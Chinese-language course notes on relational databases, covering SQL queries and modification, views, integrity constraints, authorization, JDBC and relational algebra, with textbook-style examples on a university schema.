找出系平均工资超过42000美元的那些系中教师的平均工资 select dept_name, avg_salary from (select dept_name, avg (salary) avg_salary from instructor group by dept_name) where avg_salary \u003e 42000;   with子句 with子句提供了定义临时关系的方法，这个定义支队包含with的子句的查询有效\n1 2 3 4 5 6 7 8  # 例 # 找出具有最大预算值的系 with max_budget (value) as (select max(budget) from department) select budget from department, max_budget where department.budget = max_budget.value;   with子句在写复杂查询时非常有用\n标量子查询 SQL允许子查询出现在返回单个值的表达式能够出现的任何地方，只要该子查询只返回包含单个属性的单个元组；这样的子查询称为标量子查询（scalar subquery）\n标量子查询只返回包含单个属性的单个元组\n如果子查询的结果返回多个元组，则会产生运行错误\n数据库的修改  从一个给定的关系中删除元组：delete from 向一个给定的关系插入新的元组：insert into 将一个给定的关系的一些元组的值更新：update  删除 1  delete\tfrom\ttable_name\t[where\t\u003c条件表达式\u003e]   从表中删除符合条件的元组，如果没有where语句，则删除所有元组\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # 例 # 删除 instructors 关系中的所有元组 delete\tfrom instructor # 从 instructors 关系中删除与 Finance 系教师相关的所有元组 delete\tfrom\tinstructor where\tdept_name = 'Finance' #从 instructor 关系中删除在位于 Watson 大楼的系工作的教师元组 delete\tfrom\tinstructor where\tdept_name\tin(select\tdept_name from\tdepartment where\tbuilding = 'Watson') # 删除工资低于大学平均工资的教师记录 delete\tfrom instructor where\tsalary\t\u003c (select\tavg(salary)\tfrom\tinstructor)   插入 1 2 3  insert\tinto\ttable_name\t[(col1 [,col2]...)] values\t(val1 [,val2]...)   插入一条指定好值的元组\n1 2  insert\tinto\ttable_name\t[(col1 [,col2]...)] (子查询)   插入子查询结果中的若干条元组\ninto子句  指定要插入数据的表名及属性列 属性列的顺序可以与表定义中的顺序不一致 没有指定属性列：表示要插入的是一条完整的元组，且属性列属性与表定义中的顺序一致 指定部分属性列：插入的元组在其余属性列上取空值  values子句  提供的值必须与into子句匹配：值的个数\u0026\u0026值的类型  子查询  select子句目标列必须与into子句匹配：值的个数\u0026\u0026值的类型  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # 例 # 向 course 关系中插入新元组 insert into course values (‘CS-437’,‘Database Systems’,‘Comp. Sci.’, 4); insert into course (course_id, title, dept_name, credits) values (‘CS-437’, ‘Database Systems’, ‘Comp. Sci.’, 4); # 向 student 关系中插入新元组，并将tot_creds 属性设置为null insert into student values (‘3003’, ‘Green’, ‘Finance’, null); # 将instructor 关系中的所有元组插入到student 关系里，并将属性tol_credits设置为0 insert into student select ID, name, dept_name, 0 from instructor    select from where 语句在它的结果被插入到相应的关系之前就完成了评估，否则，像这样的查询 insert into table1 select * from table1，如果table1没有主码的话，会出现问题  更新 1 2 3 4 5  update\ttable_name set\tcol_name1 = 表达式|子查询 col_name2 = 表达式|子查询 ... [where 条件表达式]   指定对哪些列进行更新，以及更新后的值是什么\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # 例 # 老师工资上调5% update\tPROF set\tSAL = SAL * 1.05 #将d1系的学生年龄增加1岁 update\tStudent set\tS_age = S_age + 1 where dno = 'd1' # 将d1系全体学生的成绩置零 update SC set\tScore = 0 where 'd1' = (select dno from S where\tS.Sno = SC.Sno) # 将D01系系主任的工资改为该系的平均工资 update PROF set\tSAL = (select avg(SAL) from\tPROF where\tDno = D01) where\tPno = (select\tDEAN from\tDEPT where\tDno = D01)   为条件更新使用Case语句 1 2 3 4 5 6  # 例 update\tinstructor set\tsalary = case when\tsalary \u003c= 100000 then salary * 1.05 else\tsalary *1.03 end   使用标量子查询的更新 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # 例 # 为关系student重新计算并更新tot_credit属性的值 update\tstudent S set\ttot_credit\t=\t(select\tsum(credits) from\ttakes\tnatural join course where\tS.ID = takes.ID and takes.grade \u003c\u003e 'F' and takes.grade\tis not null); # 如果一个学生没有成功学完任何一个课程，则将其tot_creds 属性设为空 # 不使用sum(credits)，而是使用: \tcase when\tsum(credits) is not null then sum(credits) else 0 end   中级SQL 连接表达式 连接关系 连接操作作用于两个关系并返回一个关系作为结果\n一个连接操作是一个笛卡儿积，并且要求两个关系的元组满足某些匹配条件，他还指定在连接结果中要出现的属性\njoin操作通常用作from子句中的子查询表达式\n外连接   一个扩展的连接操作，避免了信息的损失\n  计算join，然后将一个关系中与另一个不匹配的元组添加到结果中\n  使用null值\n  对于该关系，我们有左外连接、右外连接、全外连接和内连接\n左外连接如下：\n右外连接如下：\n简而言之，往哪连接，被连接的表的主码全部需要保留，然后将其连接的属性有则填入，无则赋null\n若找不到相应的主码，则将连接的表的那一行丢弃\n全外连接如下：\n 连接操作将两个关系作为输入，返回一个关系作为结果 连接条件：规定了这两个关系中的哪些元组匹配，以及在连接结果中出现了什么属性 连接类型：规定了对每个关系中（基于连接条件）不与其他关系中的元组相匹配的元组怎样处理  对于自然连接，会自动合并相同的列，但是连接会保留列\n例子如下：\n视图 在某些情况下，让所有的用户看到整个逻辑模型（即所有实际存储在数据库中的关系）是不可取的\n视图提供一个对某些用户从视图中隐藏某些数据的机制\n任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系称为视图。\n定义 1  create\tview\tv\tas\t\u003cquery expression\u003e   其中，\u003cquery expression\u003e可以是任何合法的SQL表达式，v表示视图名\n一旦定义了一个视图，我们就可以用视图指代该视图生成的虚关系\n定义视图时并不是由查询表达式的执行结果创造一个新关系，相反，一个视图的定义导致存储一个查询表达式，当该视图被使用时，他就被这个已存储的查询表达式替换（有点类似C++的宏定义）\n特点  虚表，是从一个或几个基本表（或视图）导出的关系 只存放视图的定义，不会出现数据冗余 基表中的数据发生变化，从视图中查询的数据也随之改变 查询时，视图名可以出现在任何关系名可以出现的地方  对比  视图(view) vs 派生查询(with)：  视图存储在DB数据字典中，是数据库模式的一部分 with定义的派生关系，仅在所属的SQL有效，不属于DB模式   视图(view) vs 表(table)：  视图和表都是关系，都可以在SQL中直接应用 DB中存储表的模式定义和数据 DB中值存储视图的定义，不存视图的数据 视图数据实在使用视图时临时计算的 物化视图是提高计算的一种手段，结果等价于临时计算   视图的作用：  对外模式的支持 安全性、方便性    1 2 3 4 5 6 7 8 9 10 11  # 例 # instructor关系的没有salary的属性视图 create\tview\tfaculty\tas select\tID,name,dept_name from\tinstructor # 找出Biology系的所有教师的姓名 select name from faculty where\tdept_name = 'Biology'    视图的属性名缺省为子查询结果中的属性名，也可以是显式指明，在下列情况下，必须指明视图的所有列名：  某个目标列式聚集函数或列表达式 多表连接时，选出了几个同名列作为视图的字段 需要在视图中为某个列启用新的更合适的名字 目标列是*    1 2 3 4 5 6 7 8  # 例 # 定义一个每个系的工资总和的视图 create view\tdepartments_total_salary(dept_name, total_salary) as select\tdept_name, sum(salary) from\tinstructor group by dept_name   使用其他视图定义视图 一个视图可以用于定义另一个视图的表达式中\n如果一个视图关系v2用于定义另一个视图关系v1的表达式中，则称v1直接依赖于v2\n如果一个视图关系v1直接依赖于另一个视图v2，或通过其他视图间接依赖于v2，则称v1依赖于v2\n一个视图关系如果依赖于它自身，则被称为递归的\n视图扩展 一种通过其他视图的定义来定义视图含义的方法\n设视图v1由表达式e1定义的，可能它本身就包含对视图关系的使用\n一个表达式中的视图扩展重复以下替换步骤\n repeat 找到e1中的关系vi 使用定义vi的表达式替换vi until\t在e1中没有视图关系  是要视图不是递归的，循环就能终止\n视图更新 1 2 3 4 5 6  update\tview_name set\tcol = val where\texpression delete\tfrom\tview_name where\texpression   视图的更新就是转换为表的更新\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # 例 create\tview\tIS_Student\tas select\tSno,Sname,Sage from\tStudent where\tSdept = 'IS'; #update update\tIS_Student set\tSname = 'Alice' where\tSno = '12315' #transferTo update\tStudent set Sname = 'Alice' where\tSno = '12315'\tand\tSdept = 'IS'; #insert insert\tinto\tIS_Student values('12306', 'Bob', 18) #transferTo insert\tinto\tStudnet(Sno,Sname,Sage,Sdept) values('12306','Bob',18,'IS') #delete delete\tfrom\tIS_Student where\tSno = '12315' #transferTo delete\tfrom Student where\tSno = '12315'\tand\tSdept = 'IS'   有些更新不能被单独执行，大部分的SQL实现只允许在简单视图上的更新（①from子句中只有一个数据库关系；②select子句中只包含关系的属性名，不包含任何表达式、聚集函数或distinct声明；③任何没有出现select子句中的属性可以取空值；④查询中不含有group by或having子句）\n对于行列子集视图可以更新\nwith check option  视图定义时，指定with check option，强制通过视图进行的修改，结果必须在视图中。  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # 例 ''' Sno\tSname\tSage\tDept S1\tA\t21\tC S4\tB\t20\tC S2\tC\t19\tS s3\tD\t21\tS ''' create\tview sv1\tas select\tsno,sname,sage\tfrom\ts where\tDept = 'C'\tand\tsage\u003e20 update\tsv1\tset\tsage=19\twhere\tsno = 's4' # 更以更新,更新后,B不再出现在视图中  create\tview sv1\tas select\tsno,sname,sage\tfrom\ts where\tDept = 'C'\tand\tsage\u003e20 with check\toption; update\tsv1\tset\tsage=19\twhere\tsno = 's4' # 不可以更新,update语句将被DBMS拒绝    物化视图 定义：创建一个物理表，此表包含定义视图的查询结果的所有元组\n如果查询中使用的关系发生了更新，则物化视图中的结果就会过期\n每当视图的底层关系进行更新时要更新视图，以此维护视图\n事务  工作单元 原子事务：要么全部执行，要么回滚，好像没有发生一样 从并发事务中隔离 隐式地开始一个任务  以commit\twork\t或\trollback\twork结束   多数数据库的默认情况：每个SQL语句自动提交  可以关闭自动提交了一个会话 在SQL:1999里可以使用begin atomic ... end（但这种方式不被多数数据库支持）    完整性约束  完整性约束通过保证对数据库的修改不会造成数据的不一致，来防止对数据库数据的意外破坏   单个关系上的约束\n not null：指定的属性上，不允许出现空值  限制：任何试图导致某个或某些元组非空属性为空的操作都将被拒绝   primary key：声明为主码  主码值不允许为空，也不允许出现重复 意义：关系对应到现实世界中的实体集，元组对应到实体，实体是相互可区分的，通过主码来唯一标识，若主码为空，则出现不可标识的实体，这是不容许的   unique：声明候选码  约束：不允许关系中，有两个元组在指定属性上取值相同 unique本身不限定属性非空   check(P)，P是一个谓词  约束：关系上的每一个元组，都必须满足P check可以针对一个或多个属性 check可以涉及其他表，但需考虑约束检查条件代价     对于check，我们有\n1 2 3 4 5 6 7 8 9 10 11 12  # 保证semester必须是四季即Spring,Summer,Fall,Winter中的一个 create table section ( course_id varchar (8), sec_id varchar (8), semester varchar (6), year numeric (4,0), building varchar (15), room_number varchar (7), time slot id varchar (4), primary key (course_id, sec_id, semester, year), check (semester in(‘Fall’,‘Winter’,‘Spring’,‘Summer’))   参照完整性 保证在一个关系中给定属性集上的取值也在另一关系的特定属性集的取值中出现\nA是一个属性的集合，R和S是两个包含属性A的关系，并且A是S的主码，如果对于每个而在R中出现的A在S中也出现，则A被称为R的外码\n参照完整性的级联行为 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # 参照完整性中的级联行为 create table course ( course_id\tchar(5) primary key, title\tvarchar(20), dept_name\tvarchar(20) references department) create table course ( … dept_name varchar(20), foreign key (dept_name) references department on delete cascade on update cascade, . . . ) # 级联行为的替代方式: set null,set default    删除基本关系元组  Restrict方式：只有当依赖关系中没有一个外码值与要删除的基本关系的主码值相对应时，才可以删除该元组，否则系统拒绝此删除操作 Cascade方式：将依赖关系中所有外码值与基本关系中要删除的主码值所对应的元组一起删除 Set null方式：删除基本关系中元组时，将依赖关系中与基本关系中被删主码值相对应的外码值置为空值    1  Foreign\tkey\t(Sno)\tReferences\tS(Sno)\t[on\tdelete\t[cascade|set null]]    修改基本关系元组  Restrict方式：只有当依赖关系中没有一个外码值与要修改的基本关系的主码值相对应时，才可以修改该元组主码，否则系统拒绝此次修改 Cascade方式：将依赖关系中所有与基本关系中要修改的主码值所对应的外码值一起修改为新值 Set null方式：修改基本关系中元组主码时，将依赖关系中与基本关系中被修改主码值相对应的外码值置为空值    1  Foreign\tkey\t(Sno)\tReferences\tS(Sno)\t[on\tupdate\t[cascade|set null]]   复杂check子句 1  create\tassertion\t\u003cassertion-name\u003e\tcheck\t\u003cpredicate\u003e   SQL的数据类型与模式 SQL固有的数据类型  date：日期，包括年(四位)、月、日，如date '2005-7-27' time：时间，包括小时、分、秒，如time '09:00:30'，time '09:00:30.75' timestamp：date和time的组合，如timestamp '2005-7-27 09:00:30.75' interval：时间段，如interval '1' day  两个 date/time/timestamp 类型值相减产生一个 interval 类型值 可以在 date/time/timestamp 类型的值上加减 interval 类型的值    用户定义的类型 SQL中的create type结构创建用户定义的类型\n1 2 3 4 5 6 7 8  # 例 create type\tDollars\tas numeric(12,2)\tfinal create\ttable\tdepartment( dept_name\tvarchar(20), building\tvarchar(15), budget\tDollars );   SQL-92中的create domain结构创建用户定义的域类型\n1 2 3 4 5  create\tdomain\tperson_name\tchar(20)\tnot null create domain\tdegree_level\tvarchar(10) constraint\tdegree_level_test check(value in ('Bachelors','Masters','Doctorate'))   类型和域相似，但是域本身可以指定约束，比如not null\n  用户定义类型\n 独特类型：distinct type：create type Dollars as numeric(12,2) 结构化：structured：create type person(pid char(18),name varchar(8)) 用户定义类型，本质上是对RDB的面向对象扩展    用户定义域：create domain Dollar as numeric(12,2)\n 自定义域不支持结构    Type vs Domain\n Type：进行强类型检查 Domain：不进行强类型检查，支持强制类型转换 Type由严格的OO理论基础，Domain时纯RDB的概念    大对象类型 大对象类型（照片、视频、CAD文件等）以large object类型存储\n blob：二进制数据的大对象数据类型——对象是没有被解释的二进制数据的大集合（对二进制数据的解释由数据库系统以外的应用程序完成） clob：字符数据的大对象数据类型——对象是字符数据的大集合  当查询结果是一个大对象时，返回的是指向这个大对象的指针，而不是大对象本身\nLOB：Large OBject，用于存储大空间的值，存储由指针加文件实现\nLOB访问：一般使用专用语句访问\n1 2 3 4  # Oracle select Blob doc into ... from\tbook where cno = 'c1'   授权 权限的转授和回收 允许用户把已获得的权限转授给其他用户，也可以把已授给其他用户的权限在回收上来\n权限图 节点是用户，根节点是DBA，有向边Ui → Uj ，表示用户Ui 把某权限授给用户Uj\n一个用户拥有权限的充分必要条件是在权限图有一条从根节点到该用户节点的路径\n数据库某些部分的几种授权形式：\n Read：允许读取，但是不能修改数据 Insert：允许插入新数据，但是不能修改已有的数据 Update：允许修改，但是不能删除数据 Delete：允许删除数据  修改数据库模式的几种授权形式：\n Index：允许创建和删除索引 Resources：允许创建新的关系 Alteration：允许增加或删除关系的属性 Drop：允许删除关系  SQL中的授权规范 grant语句用于授予权限\n1 2  grant\t\u003c权限列表\u003e on\t\u003c关系名|视图名\u003e to \u003c用户|角色列表\u003e   \u003c用户|角色列表\u003e：一个用户id | public，所有合法用户持有所授权限 | 一个角色\n对于某个视图授权后，并没有对该视图所基于的关系授权\n权限的授予者必须已经持有相应的权限（或者是数据库管理员）\n 权限列表：\n select：允许对关系进行读访问，或者使用视图进行查询的能力 insert：插入元组的能力 update：更新元组的能力 delete：删除元组的能力 all privileges：所有允许权限的简写形式  1 2 3  # 例 # 将对关系instructor的select权限授予用户U1U2U3 grant select on instructor to User1,User2,User3    revoke语句用于收回权限\n1 2  revoke\t\u003c权限列表\u003e on\t\u003c关系名|视图名\u003e\tfrom\t\u003c用户|角色列表\u003e   \u003c权限列表\u003e可以是all，表示收回被收回人持有的所有权限\n如果 包含public的话，则除了显式地被授予权限的用户外，所有的用户将失去权限\n如果同意权限由不同授权人两次授予同一用户，用户在一次权限被回收后，仍保持有权限\n收回权限时，若该用户已将权限授予其他用户，也一并收回\n角色 1 2 3 4 5 6 7 8 9  create\trole\tinstructor grant\tinstructor\tto Amit # 角色可以被授以权限 grant select on takes to instructor # 角色可以授以用户，也可以被授以其他角色 create\trole\tteaching_assistant grant\tteaching_assistant to instructor # instructor 继承teaching_assistant的所有权限    角色链\n1 2 3  create role dean grant instructor to dean grant dean to Satoshi   视图的权限 1 2 3 4 5 6  create view geo_instructor as ( select\t* from instructor where\tdept_name = 'Geology' ) grant\tselect on geo_instructor to geo_staff   references权限创造外码\n1  grant references (dept_name) on department to Mariano   权限的转移：with grant option\n授予其权限并允许用户可以将此权限授予其他用户\n1  grant select on table_name to Alice with grant option   高级SQL 使用程序设计语言访问数据库   动态SQL  JDBC和ODBC   嵌入式SQL   API（Application-program interface）用于程序和数据库服务器之间的交互\n应用程序调用：①与数据库服务器连接；②向数据库服务器发送SQL命令；③逐个取结果元组到程序变量\nODBC（Open Database Connectivity）：用于C，C++，C#和Visual Basic\nJDBC（JAVA Database Connective）：用于Java\nJDBC JDBC是一个支持SQL的Java API，用于与数据库系统通信\nJDBC支持查询和更新数据、检索查询结果等多种功能\nJDBC也支持元数据检索，例如查询当前数据库中的关系、关系属性的名字和类型\n 与数据库的通信模型\n 打开一个连接 创建一个statement对象 使用statement对象执行查询，发送查询并取回结果 处理错误的异常处理机制   JDBC的基本工作步骤如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  public\tstatic\tvoid\tJDBCExample(String dbid,String userid,String passwd){ try{ //1.Load the JDBC driver class  Class.forName(\"oracle.jdbc.driver.OracleDriver\"); //2.Open a database connection  //\tjdbc:database_type:mode:URI  //\tdatabase_type = [mysql,oracle,...]  //\toracle:URI: @URI  //\tmysql:URI:\t//URI  Connection\tconn = DriverManager.getConnection( \"jdbc:oracle:thin:@URI\", userid, passwd); //3.Issue SQL statements  Statement\tstmt = conn.createStatement(); /* *\t4.Process result set *\tDo\tActual\tWork */ stmt.close(); conn.close(); }catch\t(SQLException\tsqle){ System.out.println(\"SQLException: \" + sqle); } } ------------------------------------------------------------------ //Actual Work //update stmt.executeUpdate(\"insert into instructor values('\" + a1 + \"', 'Kim','Physics',98000)\"); //query Result rset = stmt.executeQuery(\"Select dept_name ,avg(salary) from instructor group by dept_name\"); while(rset.next()){ System.out.println(rset.getString(\"dept_name\") + \"\\t\" + rset.getFloat(2)); } //null rset.wasNull() = true;   JDBC：立即执行VS预备语句  立即执行  使用Statement类，将SQL语句直接交给DBMS执行 一次语句执行DBMS进行一次语句编译   使用预备语句执行  使用PreparedStatement类，SQL语句执行，首先进行编译，编译结果赋予PreparedStatement的对象 预编译的结果可被反复多次执行 同嵌入SQL预编译不同（在编译程序时进行），JDBC的预编译时在程序运行中进行的   一个SQL多次执行  使用预备语句，仅编译一次 立即执行的模式下，需多次编译 在一SQL多次执行时，使用预备语句比立即执行的    1 2 3 4 5 6 7 8 9 10 11  // 预备语句 PreparedStatement\tpStmt = conn.prepareStatement( \"insert into instructor values(?,?,?,?)\"); pStmt.setString(1,\"88888\"); pStmt.setString(2,\"Alice\"); pStmt.setString(3,\"Finance\"); pStmt.setInt(4,1250000); pStmt.executeUpdate(); pStmt.setString(1,\"88888\"); pStmt.executeUpdate();   对于查询，使用pStmt.executeQuery()，返回一个结果集（ResultSet）\n将一个来自用户的输入添加到查询时，使用预备语句比较好\nSQL语句的预编译能够有效防止SQL注入\n元数据特性 ResultSet：元数据：描述数据的数据\n1 2 3 4 5 6  ResultSet rs;//执行完查询后得到的结果 ResultSetMetaData rsmd = rs。getMetaData(); for(int i = 1;i\u003c=rsmd.getColumnCount();i++){ System.out.println(rsmd.getColumnName(i)); System.out.println(rsmd.getColumnTypeName(i)); }   如上，就是用java代码获取元数据的代码\n查询结果的元数据：①对描述查询结果集的属性类型（结果集的模式）；②对编程时不能确定的结果集模式时非常有用\n1 2 3 4 5 6 7 8 9 10  DatabaseMetaData dbmd = conn.getMetaData(); ResultSet rs = dbmd.getColumns(null, \"univdb\", \"department\", \"%\"); // Arguments to getColumns: Catalog, Schema-pattern, Table-pattern, \t// and Column-Pattern \t// Returns: One row for each column; row has a number of attributes \t// such as COLUMN_NAME, TYPE_NAME while(rs.next()) { System.out.println(rs.getString(\"COLUMN_NAME\"),rs.getString(\"TYPE_NAME\")); }   DatabaseMetaData类：JDBC的一个类，对DB数据字典进行封装，类方法可以读取数据字典元数据，屏蔽了数据字典的具体实现模式，对应用提供了访问DB数据字典元数据的标准方法\nJDBC的事务控制 在默认情况下，每个SQL语句都被作为一个被自动提交的独立的事务\n对于有多个更新的事务，这种做法并不好\n可以通过代码关闭自动提交：conn.setAutoCommit(false);\n事务必须被显式的提交或回滚：conn.commit();或conn.rollback();\n打开自动提交：conn.setAutoCommit(true);\n调用函数和过程 1 2 3  CallableStatement cStmt1 = conn.prepareCall(\"{? = call some function(?)}\"); CallableStatement cStmt2 = conn.prepareCall(\"{call some procedure(?,?)}\");   处理大型对象类型 getBlob()和getClob()与getString()方法类似，但是分别返回Blob和Clob对象\n通过getBytes()从这些对象里得到数据\n将一个开放的流域Java Blob或Clob对象相连，来更新大对象\n1  blob.setBlob(int parameterIndex, InputStream inputStream);   SQLJ 由于JDBC的动态化，编译器无法捕捉其错误，因此有SQLJ\nSQLJ：在java中的嵌入式SQL\n1 2 3 4 5 6 7 8 9 10 11  #sql iterator deptInfoIter ( String dept name, int avgSal); deptInfoIter iter = null; #sql iter = { select dept_name, avg(salary) from instructor group by dept name }; while (iter.next()) { String deptName = iter.dept_name(); int avgSal = iter.avgSal(); System.out.println(deptName + \" \" + avgSal); } iter.close();   ODBC ODBC结构如上图\nODBC：Open Database Connectivity标准：\n 应用程序与数据库服务器通信标准 应用程序接口  与数据库建立一个连接 发送查询和更新数据库的语句 取回结果    （略）\n嵌入式SQL SQL标准定义了许多语言的嵌入式SQL，如C，JAVA，Cobol\nSQL查询所嵌入的语言被称为宿主语言（host language），宿主语言中使用的SQL结构被称为嵌入式SQL\n这些语言的基本形式遵循System R的嵌入到PL/I的SQL的形式\n（略）\n函数和过程和结构 SQL：1999支持函数和过程\n 函数/过程可以用SQL自身写，也可以用外部编程语言写 函数对专门的数据类型，如图像和几何对象特别有用 许多数据库系统支持表值函数（table-valued functions），表值函数会返回一个关系作为结果  SQL：1999支持许多命令式结构，包括循环（loops）、if-then-else、赋值（assignment）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # 定义一个函数,输入一个系的名字,返回该系的教师数量 create\tfunction\tdept_count(dept_name\tvarchar(20)) returns\tinteger begin declare\td_count\tinteger; select\tcount(*)\tinto\td_count from\tinstructor where\tinstructor.dept_name = dept_name return d_count; end # 找出教师数大于12的所有系的名称和预算 select\tdept_name,budget from department where\tdept_count(dept_name) \u003e 12   SQL：2003增加了返回关系作为结果的函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # 返回一个包含特定系的所有教师的表 create\tfunction\tinstructors_of\t(dept_name\tchar(20)) returns\ttable\t(ID\tvarchar(5), name varchar(20), dept_name varchar(20), salary\tnumeric(8,2)) return table (select ID,name,dept_name,salary from\tinstructor where\tinstructor.dept_name = instructors_of.dept_name) #use select * from\ttable\t(instructs_or('Music'))   dept_count函数也可以写成一个过程\n1 2 3 4 5 6 7 8 9 10 11 12 13  create procedure dept_count_proc (in dept_name varchar(20), out d_count integer) begin select count(*) into d_count from instructor where instructor.dept_name = dept_count_proc.dept_name end # 可以在一个SQL过程中或者嵌入式SQL中使用call语句调用过程 declare\td_count\tinteger; call\tdept_count_proc('Physics',d_count);   过程和函数可以通过动态SQL触发\nSQL:1999：允许使用多个同名过程/函数（称为名字重载），只要参数的个数不同，或对于那些有相同参数个数的函数，至少有一个参数的类型不同\n触发器 （略）\n形式化关系查询语言 关系代数  关系代数 六种基本运算符  选择（Select）：σ 投影（Project）：Π 并（union）：∪ 集合差（set difference）：- 笛卡儿积（Cartesian product）：× 更名（rename）：ρ   关系代数的运算以一个或两个关系作为输入，产生一个新的关系作为结果  选择运算   记法：σp(r)\n  p被称为选择谓词\n  定义为： σp(r) = { t | t ∈ r and p(t) }，其中p是一个命题演算公式，由连词（∧(and)，∨(or)， ┐(not)）把项连接起来构成每一个项（term）的形式可以为：\u003cattribute\u003e op \u003cattribute\u003e or \u003cconstant\u003e ，其中op可以是：=，≠，\u003e，≥，\u003c，≤\n  示例：σ dept_name = \"Physics\"(instructor)\n  选择运算是从行的角度进行的运算\n投影运算  记法：ΠA1,A2,...,Ak(r) ，其中A1,A2,...,Ak 是属性名，r是关系名 结果由选择的k列组成，删除了没有被选择的其他列 因为关系是集合，所以重复的元组从结果中删除 示例：ΠID, name, salary(instructor)  投影操作主要是从列的角度进行运算\n并运算  记法：r ∪ s 定义为：r ∪ s = { t | t ∈ r or t ∈ s } 要使并运算r∪s有意义  r，s必须是同元的（属性数目必须相同） 属性的域必须相容（如r的第二列的属性类型必须和s的第二列类型相同）   示例：找出开设在2009年秋季学期或者2010年春季学期或者这二者皆开的所有的课程： Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) ∪ Πcourse_id (σ semester=“Spring” Λ year=2010 (section) )  集合差运算  记法：r - s 定义为：r - s = { t | t ∈ r and t ∉ s } 必须保证集合差运算在相容的关系间进行  r 和 s必须是同元的 r 和 s属性的域必须相容   示例：找出开设在2009年秋季学期但是在2010年春季学期不开的课程： Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) - Πcourse_id (σ semester=“Spring” Λ year=2010 (section) )  基本运算的分配律  投影和并可以分配  Πpid,name(S∪T) ≡ Πpid,name(S) ∪ Πpid,name(T)   投影和差不可分配  笛卡儿积运算   记法：r × s\n  定义为：r × s = { tq | t ∈ r and q∈ s }\n 元组的连串（Concatenation）：若r = (r1,..,rn)，s = (s1,...,sm)，则定义r与s的连串为一个n+m的元组，记作rs = (r1,...,rn,s1,s...,sm)    假设关系r(R)和s(S)的属性不相交（即R ∩ S = Φ ）\n  如果关系r(R)和s(S)的属性有相交的，则必须使用更名运算\n  示例：\n  运算的组合 如图为一个例子\n更名运算  允许通过更名来引用关系代数表达式的结果 允许引用一个关系时使用多于一个的名字 如： ρX(E) ：返回更名为X的表达式E的结果 如果关系代数表达式E时n元的，则 ρ χ(A1,A2,...,An)(E) ，返回被更名为X的表达式E的结果，并且属性被更名为A1，A2，...，An  关系代数表达式嵌套  关系代数中基本的表达式是如下二者之一：  数据库中的一个关系 一个常数关系   n设E1 和E2是关系代数表达式，则以下这些都是关系代数表达式：  E1 ∪ E2 E1 – E2 E1 x E2 σp (E1), 其中P是E1的属性上的谓词 Πs(E1),其中S 是E1中某些属性的列表 ρx (E1),其中x 是E1结果的新名字    附加关系代数运算  附加运输没有实质地扩展关系代数的能力，但是简化了查询的书写  集合交 自然连接 赋值 外连接     集合交运算  记法：r ∩ s 定义为： r ∩ s = { t | t ∈ r and t ∈ s }  r 和 s 是同元的 r 和 s 属性域相容   注： r ∩ s = r - ( r - s ) = s - ( s - r )  θ连接 定义：\n 所以，θ连接是做笛卡儿积，然后筛选出符合AθB表达式的元组作为结果返回  自然连接运算  记法：r ⋈ s 定义：关系 r 和 s 分别是模式 R 和 S 的关系，则 r ⋈ s 是由如下方式得到的模式 R ∪ S 的关系  对于 r 中的每个元组 tr 和 s 中的每个元组 ts 所组成的元组对 如果 tr 和 ts 在 R ∩ S的属性上有相同的值，则在结果中加入一个元组t，并且：  t 在r上和 tr 有相同的值 t 在s上和 ts 有相同的值     示例：若R = (A,B,C,D) ，S = (E,B,D) ，结果模式 = (A,B,C,D,E) ，则 r ⋈ s = Πr.A, r.B, r.C, r.D, s.E  ( σ r.B = s.B Λ r.D = s.D (r × s ) )    自然连接和等值连接的不同\n 自然连接中相等的分量必须是相同的属性组，并且要在结果中去掉重复的属性，二等值连接则不必    当 R 与 S 无相同属性时， R ⋈ S = R × S\n  可交换，可结合\n s ⋈ sc ≡ sc ⋈ s ( s ⋈ sc ) ⋈ c ≡ s ⋈ ( sc ⋈ c )    赋值运算  赋值运算（⬅）提供了一种简化关系代数表达式书写的方式  把查询表达为一个顺序程序，由以下构成  一系列赋值 一个其值被作为查询结果显示的表达式   赋值必须是赋给一个临时关系变量    外连接  外连接运算是连接运算的扩展，可以处理缺失的信息 计算连接，然后一个关系中失配的元组添加到结果中 使用空值（null）：  null代表一个值未知或不存在 所有的包含null比较运算都被定义为false   示例：  现有关系如下图：\n有连接、左外连接、右外连接、全外连接如下：\n连接即将表做笛卡儿积，筛选出相同属性拥有相同值的元组，将其连接起来成为一个新的元组\n左外连接即保证左表的主码完整性，右外连接保证右表的主码完整性\n全外连接保证全部数据的不被舍弃\n均用空值null填补空白的属性\n外连接运算可以用基本关系代数表示\n空值   元组的一些属性可以为空值，用null表示\n  null代表一个值未知或不存在，空值是一种状态，不是一个明确的值\n  含有null的算数表达式的结果为null\n  聚集函数直接忽略空值（比如在SQL里）\n  在去重和分组运算中，null和其他值一样，两个null被看作是相同的值\n  含有空值的比较运算的结果是一个特殊的值：unknown\n 如果用 false 取代 unknown，那么 not (A \u003c 5) 和 A \u003e= 5不等价    使用unknown的三值逻辑\n or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown and unknown) = unknown not：not unknown = unknown 在SQL中，若谓词P的值为unknown，则P is unknown = true    选择（select）谓词的结果如果是unknown，则相当于false\n  除运算  定义：给定两个关系 r(R) 和 s(S) ，并且 S ⊂ R，则 r ÷ s 是满足 t × s ⊆ r 的最大关系t(R-S) 可以将 r ÷ s 写为：temp1 ⬅ ΠR-S(r) ，temp2 ⬅ ΠR-S( (temp1 × s) - ΠR-S, S(r) ) ，result = temp1 - temp2 示例： r÷s给出的学生ID选了Biology系卡的所有课 r(ID, course_id) = Π ID, course_id(takes) 且 s(course_id) = Πcourse_id(σdept_name = \"Boilogy\" (course))  扩展的关系代数运算  广义投影 聚集函数  广义投影  